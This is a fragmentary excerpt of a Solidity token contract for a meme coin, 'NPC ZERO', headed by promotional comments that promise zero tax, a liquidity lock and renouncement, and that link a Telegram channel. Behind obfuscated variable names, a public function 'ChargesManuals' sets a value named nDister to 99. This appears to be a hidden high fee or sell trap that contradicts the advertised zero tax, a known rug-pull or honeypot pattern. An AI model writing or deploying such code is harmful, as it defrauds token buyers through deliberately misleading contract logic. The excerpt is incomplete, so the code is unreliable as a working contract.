...
// TG CHANNEL : https://t.me/NPCZeroErc

// SPDX-License-Identifier: MIT

// Last Project on Elon's tweet did 1.1Million

// 0 TAX , LOCK AND RENOUNCE AT LAUNCH..

// Community chat will be created on 50 subs.
...
contract NPCZero is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "NPC ZERO";
    string private constant _symbol = "NPC0";
    ...
    uint256 private NewValuation = nDister;
    ...
    uint256[2][2] thirdTarr = [[99,3],[2,3]];
    uint256[9] NewTwoD = [1,3];
    ...
    function ChargesManuals() public returns(bool) {
        nDister = thirdTarr[0][0];
        return true;
    } 
